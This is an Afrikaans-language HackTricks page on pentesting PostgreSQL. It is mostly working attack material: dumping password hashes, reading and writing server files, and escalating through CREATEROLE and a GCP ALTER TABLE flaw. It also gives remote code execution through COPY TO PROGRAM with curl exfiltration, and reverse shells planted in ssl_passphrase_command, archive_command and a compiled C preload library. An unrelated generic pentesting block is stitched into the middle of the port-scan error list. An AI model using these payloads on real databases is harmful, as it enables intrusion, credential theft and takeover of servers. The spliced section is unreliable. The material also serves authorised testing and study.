# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik **werkstrome te bou** en te **outomatiseer** met behulp van die w√™reld se **mees gevorderde** gemeenskaplike gereedskap.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## **Basiese Inligting**

**PostgreSQL** word beskryf as 'n **objek-relasionele databasisstelsel** wat **oorspronklik** is. Hierdie stelsel maak nie net gebruik van die SQL-taal nie, maar verbeter dit ook met addisionele kenmerke. Sy vermo√´ns stel dit in staat om 'n wye verskeidenheid data-tipes en operasies te hanteer, wat dit 'n veelsydige keuse maak vir ontwikkelaars en organisasies.

**Verstekpoort:** 5432, en as hierdie poort reeds in gebruik is, lyk dit asof postgresql die volgende poort (waarskynlik 5433) sal gebruik wat nie in gebruik is nie.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Verbind & Basiese Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
As jy **`\list`** hardloop en 'n databasis met die naam **`rdsadmin`** vind, weet jy dat jy binne 'n **AWS postgresql databasis** is.
{% endhint %}

Vir meer inligting oor **hoe om 'n PostgreSQL databasis te misbruik** kyk:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Outomatiese Opsomming
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Poort skandering**

Volgens [**hierdie navorsing**](https://www.exploit-db.com/papers/13084), wanneer 'n verbindingspoging misluk, gooi `dblink` 'n `sqlclient_unable_to_establish_sqlconnection` uitsondering wat 'n verduideliking van die fout insluit. Voorbeelde van hierdie besonderhede word hieronder gelys.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Gasheer is af

`DETAIL: kon nie aan die bediener koppel nie: Geen roete na gasheer Is die bediener aan die hardloop op gasheer "1.2.3.4" en aanvaar TCP/IP-koppeling op poort 5678?`

* Poort is toe
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Poort is oop
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
### PostgreSQL Pentesting

#### PostgreSQL Enumeration

PostgreSQL kan ge√´numereer word deur die volgende stappe te volg:

1. **Port Scanning**: Skandeer vir die PostgreSQL-diens op poort 5432.
2. **Banner Grabbing**: Gebruik `telnet` of `nmap` om die PostgreSQL-diens se banner te ondersoek.
3. **Version Detection**: Identifiseer die weergawe van PostgreSQL wat uitgevoer word.

#### PostgreSQL Exploitation

Potensi√´le aanvalle teen PostgreSQL sluit in:

1. **Brute Force-aanvalle**: Probeer standaardgebruikersname en wagwoorde.
2. **SQL Injection**: Exploiteer swak SQL-navrae om toegang te verkry.
3. **Backdoor-toegang**: Skep 'n agterdeur om toegang te behou.

#### PostgreSQL Security Best Practices

Om PostgreSQL te beveilig, moet die volgende maatre√´ls getref word:

1. **Sterk wagwoordbeleid**: Vereis lang en unieke wagwoorde.
2. **Beperk toegang**: Stel toegangsbeheer in om slegs geautoriseerde gebruikers toe te laat.
3. **Verseker dat sagteware opgedateer word**: Installeer gereeld opdaterings en patches vir PostgreSQL.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Poort is oop of gefiltreer
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
In PL/pgSQL funksies, is dit tans nie moontlik om uitsonderingsbesonderhede te verkry nie. Indien jy egter direkte toegang tot die PostgreSQL-bediener het, kan jy die nodige inligting terugwin. As dit nie haalbaar is om gebruikersname en wagwoorde uit die stelseltabelle te onttrek nie, kan jy oorweeg om die woordelysaanvalmetode wat bespreek is in die vorige afdeling, te gebruik, aangesien dit moontlik positiewe resultate kan oplewer.

## Opsomming van Voorregte

### Rolle

| Rol Tipes      |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rol het supergebruiker-voorregte                                                                                                                    |
| rolinherit     | Rol erf outomaties voorregte van rolle waarvan dit 'n lid is                                                                                         |
| rolcreaterole  | Rol kan meer rolle skep                                                                                                                             |
| rolcreatedb    | Rol kan databasisse skep                                                                                                                            |
| rolcanlogin    | Rol kan aanmeld. Dit beteken dat hierdie rol as die aanvanklike sessie-outorisasie-identifiseerder gegee kan word                                   |
| rolreplication | Rol is 'n replikasie rol. 'n replikasie rol kan replikasieverbindinge inisieer en replikasieslotte skep en laat val                                      |
| rolconnlimit   | Vir rolle wat kan aanmeld, stel dit die maksimum aantal gelyktydige verbindinge in wat hierdie rol kan maak. -1 beteken geen limiet.                  |
| rolpassword    | Nie die wagwoord nie (lees altyd as `********`)                                                                                                      |
| rolvaliduntil  | Wagwoordvervaltyd (slegs gebruik vir wagwoordverifikasie); nul indien geen verval                                                                    |
| rolbypassrls   | Rol verbygaan elke ryvlak-sekuriteitsbeleid, sien [Afdeling 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) vir meer inligting.   |
| rolconfig      | Rol-spesifieke verstekwaardes vir hardlooptydkonfigurasie-veranderlikes                                                                               |
| oid            | ID van rol                                                                                                                                           |

#### Interessante Groepe

* As jy 'n lid is van **`pg_execute_server_program`** kan jy **programme uitvoer**
* As jy 'n lid is van **`pg_read_server_files`** kan jy **l√™ers lees**
* As jy 'n lid is van **`pg_write_server_files`** kan jy **l√™ers skryf**

{% hint style="info" %}
Let daarop dat in Postgres 'n **gebruiker**, 'n **groep** en 'n **rol** dieselfde is. Dit hang net af van **hoe jy dit gebruik** en of jy dit toelaat om aan te meld.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabelle
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funksies
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## L√™erstelselaksies

### Lees gids en l√™ers

Vanaf hierdie [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) kan lede van die gedefinieerde **`DEFAULT_ROLE_READ_SERVER_FILES`** groep (genaamd **`pg_read_server_files`**) en **supergebruikers** die **`COPY`** metode gebruik op enige pad (kyk na `convert_and_check_filename` in `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Onthou dat as jy nie 'n supergebruiker is nie, maar **CREATEROLE**-permissies het, kan jy **jouself lid van daardie groep maak:**
```sql
GRANT pg_read_server_files TO username;
```
Daar is **ander postgres-funksies** wat gebruik kan word om **'n l√™er te lees of 'n gids te lys**. Slegs **supergebruikers** en **gebruikers met uitdruklike toestemmings** kan hulle gebruik:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Jy kan **meer funksies** vind by [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Eenvoudige L√™er Skryf

Slegs **super gebruikers** en lede van **`pg_write_server_files`** kan `copy` gebruik om l√™ers te skryf.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Onthou dat as jy nie 'n supergebruiker is nie, maar die **`CREATEROLE`**-permissies het, kan jy **jouself lid van daardie groep maak:**
```sql
GRANT pg_write_server_files TO username;
```
[**Meer inligting.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Onthou dat KOPIE nie nuwe lynkarakters kan hanteer nie, daarom moet jy selfs as jy 'n base64-lading gebruik 'n eenlynstuk stuur. 'n Baie belangrike beperking van hierdie tegniek is dat `copy` nie gebruik kan word om bin√™re l√™ers te skryf nie omdat dit sommige bin√™re waardes wysig.

### Oplaai van bin√™re l√™ers

Daar is egter ander tegnieke om groot bin√™re l√™ers op te laai:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings tot **$100,000** te verdien!

{% embed url="https://go.intigriti.com/hacktricks" %}

### Opdatering van PostgreSQL tabeldata via plaaslike l√™erskryf

As jy die nodige regte het om PostgreSQL-bedienerl√™ers te lees en te skryf, kan jy enige tabel op die bediener opdateer deur die geassosieerde l√™ernode te **owerwrite** in [die PostgreSQL data-gids](https://www.postgresql.org/docs/8.1/storage.html). **Meer oor hierdie tegniek** [**hier**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Vereiste stappe:

1. Kry die PostgreSQL data-gids

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Nota:** As jy nie die huidige data-gids vanaf instellings kan kry nie, kan jy die hoof PostgreSQL-weergawe deur die `SELECT version()`-navraag kry en probeer om die pad te brute force. Gewone data-gidspaaie op Unix-installasies van PostgreSQL is `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. 'n Gewone klasternaam is `main`.
2. Kry 'n relatiewe pad na die filenode wat geassosieer is met die teikentabel

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Hierdie navraag behoort iets soos `base/3/1337` terug te gee. Die volledige pad op skyf sal wees `$DATA_DIRECTORY/base/3/1337`, m.a.w. `/var/lib/postgresql/13/main/base/3/1337`.
3. Laai die filenode af deur die `lo_*`-funksies

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4. Kry die datatipe wat geassosieer is met die teikentabel

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```
5. Gebruik die [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) om [die filenode te wysig](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); stel alle `rol*` booleaanse vlae in op 1 vir volle regte.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)
6. Laai die gewysigde filenode weer op deur die `lo_*`-funksies, en oorskryf die oorspronklike l√™er op die skyf

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7. _(Opsioneel)_ Maak die in-memory tabelkassie skoon deur 'n duur SQL-navraag uit te voer

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. Jy behoort nou opgedateerde tabelwaardes in die PostgreSQL te sien.

Jy kan ook 'n superadmin word deur die `pg_authid`-tabel te wysig. **Sien** [**die volgende afdeling**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE na program**

Vanaf [weergawe 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), kan slegs **supergebruikers** en lede van die groep **`pg_execute_server_program`** `copy` gebruik vir RCE (voorbeeld met eksfiltrering:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Voorbeeld om uit te voer:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Onthou dat as jy nie 'n supergebruiker is nie, maar die **`CREATEROLE`**-permissies het, kan jy **jouself lid van daardie groep maak:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Meer inligting.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Of gebruik die `multi/postgres/postgres_copy_from_program_cmd_exec` module van **metasploit**.\
Meer inligting oor hierdie kwesbaarheid [**hier**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Terwyl dit as CVE-2019-9193 gerapporteer is, het Postges verklaar dat dit 'n [kenmerk is en nie reggestel sal word nie](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE met PostgreSQL Tale

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE met PostgreSQL-uitbreidings

Nadat jy uit die vorige pos geleer het **hoe om bin√™re l√™ers te oplaai**, kan jy probeer om **RCE te verkry deur 'n postgresql-uitbreiding op te laai en dit te laai**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL konfigurasie-l√™er RCE

{% hint style="info" %}
Die volgende RCE-vektore is veral nuttig in beperkte SQLi-kontekste, aangesien alle stappe deur geneste SELECT-stellings uitgevoer kan word
{% endhint %}

Die **konfigurasie-l√™er** van PostgreSQL is **skryfbaar** deur die **postgres-gebruiker**, wat die een is wat die databasis hardloop, sodat jy as **supergebruiker** l√™ers in die l√™ersisteem kan skryf, en dus kan jy **hierdie l√™er oorskryf.**

![](<../.gitbook/assets/image (303).png>)

#### **RCE met ssl\_passphrase\_command**

Meer inligting [oor hierdie tegniek hier](https://pulsesecurity.co.nz/articles/postgres-sqli).

Die konfigurasie-l√™er het 'n paar interessante eienskappe wat tot RCE kan lei:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Pad na die privaatsleutel van die databasis
* `ssl_passphrase_command = ''` As die privaat l√™er deur 'n wagwoord beskerm word (ge√´nkripteer) sal postgresql die opdrag aangedui in hierdie eienskap **uitvoer**.
* `ssl_passphrase_command_supports_reload = off` **Indien** hierdie eienskap **aan** is, sal die **opdrag** uitgevoer word as die sleutel deur 'n wagwoord beskerm word wanneer `pg_reload_conf()` **uitgevoer** word.

Dan sal 'n aanvaller moet:

1. **Dump privaatsleutel** van die bediener
2. **Enkripteer** afgelaaide privaatsleutel:
1. `rsa -aes256 -in afgelaai-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Oorskryf**
4. **Dump** die huidige postgresql **konfigurasie**
5. **Oorskryf** die **konfigurasie** met die genoemde eienskappekonfigurasie:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Voer `pg_reload_conf()` uit

Tydens die toets van hierdie het ek opgemerk dat dit net sal werk as die **privaatsleutel-l√™er die regte 640-privileges het**, dit **deur root besit word** en deur die **groep ssl-cert of postgres** (sodat die postgres-gebruiker dit kan lees), en in _/var/lib/postgresql/12/main_ geplaas is.

#### **RCE met archive\_command**

**Meer** [**inligting oor hierdie konfigurasie en oor WAL hier**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

'n Ander eienskap in die konfigurasie-l√™er wat uitgebuit kan word, is `archive_command`.

Om dit te laat werk, moet die `archive_mode`-instelling `'aan'` of `'altyd'` wees. As dit waar is, kan ons die opdrag in `archive_command` oorskryf en dit dwing om via die WAL (write-ahead logging) operasies uit te voer.

Die algemene stappe is:

1. Kontroleer of argiefmodus geaktiveer is: `SELECT current_setting('archive_mode')`
2. Oorskryf `archive_command` met die lading. Byvoorbeeld, 'n omgekeerde dop: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Herlaai die konfigurasie: `SELECT pg_reload_conf()`
4. Dwings die WAL-operasie om uit te voer, wat die argiefopdrag sal aanroep: `SELECT pg_switch_wal()` of `SELECT pg_switch_xlog()` vir sommige Postgres-weergawes

#### **RCE met voorlaai biblioteke**

Meer inligting [oor hierdie tegniek hier](https://adeadfed.com/posts/postgresql-select-only-rce/).

Hierdie aanvalvektor maak gebruik van die volgende konfigurasie-veranderlikes:

* `session_preload_libraries` -- biblioteke wat deur die PostgreSQL-bedienaar by die kli√´ntverbinding gelaai sal word.
* `dynamic_library_path` -- lys van gids waar die PostgreSQL-bedienaar vir die biblioteke sal soek.

Ons kan die `dynamic_library_path`-waarde instel op 'n gids wat deur die `postgres`-gebruiker wat die databasis hardloop, skryfbaar is, bv., `/tmp/`-gids, en 'n skadelike `.so`-voorwerp daar oplaai. Vervolgens sal ons die PostgreSQL-bedienaar dwing om ons nuut opgelaaide biblioteek te laai deur dit in die `session_preload_libraries`-veranderlike in te sluit.

Die aanvalstappe is:

1. Laai die oorspronklike `postgresql.conf` af
2. Sluit die `/tmp/`-gids in die `dynamic_library_path`-waarde in, bv. `dynamic_library_path = '/tmp:$libdir'`
3. Sluit die skadelike biblioteeknaam in die `session_preload_libraries`-waarde in, bv. `session_preload_libraries = 'payload.so'`
4. Kontroleer die hoof PostgreSQL-weergawe via die `SELECT version()`-navraag
5.  Kompileer die skadelike biblioteekkode met die korrekte PostgreSQL-dev-pakket Voorbeeldkode:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Kompilering van die kode:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
6. Laai die skadelike `postgresql.conf`, geskep in stappe 2-3, af en oorskryf die oorspronklike een
7. Laai die `payload.so` van stap 5 na die `/tmp`-gids op
8. Herlaai die bedienerskonfigurasie deur die bediener te herlaai of die `SELECT pg_reload_conf()`-navraag te roep
9. By die volgende DB-verbinding sal jy die omgekeerde dopverbinding ontvang.
## **Postgres Privesc**

### CREATEROLE Privesc

#### **Toekenning**

Volgens die [**dokumente**](https://www.postgresql.org/docs/13/sql-grant.html): _Rolle met die **`CREATEROLE`** voorreg kan **lidmaatskap in enige rol toeken of herroep** wat **nie** 'n **superuser** is nie._

Dus, as jy **`CREATEROLE`** toestemming het, kan jy jouself toegang gee tot ander **rolle** (wat nie superuser is nie) wat jou die opsie kan gee om l√™ers te lees en skryf en opdragte uit te voer:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Wysig Wagwoord

Gebruikers met hierdie rol kan ook die wagwoorde van ander nie-supergebruikers **verander**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc na SUPERUSER

Dit is redelik algemeen om te vind dat **plaaslike gebruikers kan aanmeld by PostgreSQL sonder om enige wagwoord te verskaf**. Daarom, sodra jy **toestemmings om kode uit te voer** ingesamel het, kan jy hierdie toestemmings misbruik om jou **`SUPERUSER`** rol te verkry:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Dit is gewoonlik moontlik as gevolg van die volgende lyne in die **`pg_hba.conf`** l√™er:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **WYSIG TABEL privesc**

In [**hierdie skrywe**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) word verduidelik hoe dit moontlik was om **privesc** in Postgres GCP te misbruik deur die ALTER TABLE-voorreg wat aan die gebruiker verleen is.

Wanneer jy probeer om **'n ander gebruiker eienaar van 'n tabel te maak**, behoort jy 'n **fout** te kry wat dit voorkom, maar blykbaar het GCP daardie **opsie aan die nie-supergebruiker postgres-gebruiker** in GCP gegee:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Deur hierdie idee te koppel met die feit dat wanneer die **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) opdragte uitgevoer word op 'n **tabel met 'n indeksfunksie**, word die **funksie** as deel van die opdrag met die **eienaar se toestemmings** geroep. Dit is moontlik om 'n indeks met 'n funksie te skep en eienaarskapstoestemmings aan 'n **supergebruiker** oor daardie tabel te gee, en dan ANALYZE oor die tabel uit te voer met die skadelike funksie wat bevele kan uitvoer omdat dit die toestemmings van die eienaar gebruik.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Uitbuiting

1. Begin deur 'n nuwe tabel te skep.
2. Voeg 'n paar irrelevante inhoud by die tabel in om data vir die indeksfunksie te voorsien.
3. Ontwikkel 'n skadelike indeksfunksie wat 'n koderingsuitvoeringslading bevat, wat ongemagtigde bevele moontlik maak om uitgevoer te word.
4. WYSIG die eienaar van die tabel na "cloudsqladmin," wat GCP se supergebruikersrol is wat uitsluitlik deur Cloud SQL gebruik word om die databasis te bestuur en te onderhou.
5. Voer 'n ANALYSE-operasie op die tabel uit. Hierdie aksie dwing die PostgreSQL-enjin om na die gebruikerskonteks van die tabel se eienaar, "cloudsqladmin," te skakel. Gevolglik word die skadelike indeksfunksie met die regte van "cloudsqladmin" geroep, wat die uitvoering van die voorheen ongemagtigde skul bevel moontlik maak.

In PostgreSQL lyk hierdie vloei so iets:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Dan sal die `shell_commands_results` tabel die uitset van die uitgevoerde kode bevat:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Plaaslike Aanteken

Sommige verkeerd geconfigureerde postgresql-instanties mag dalk enige plaaslike gebruiker toelaat om in te teken, dit is moontlik om plaaslik vanaf 127.0.0.1 in te teken deur die **`dblink`-funksie**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Let daarop dat vir die vorige navraag om te werk **die funksie `dblink` moet bestaan**. As dit nie bestaan nie, kan jy probeer om dit te skep met
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

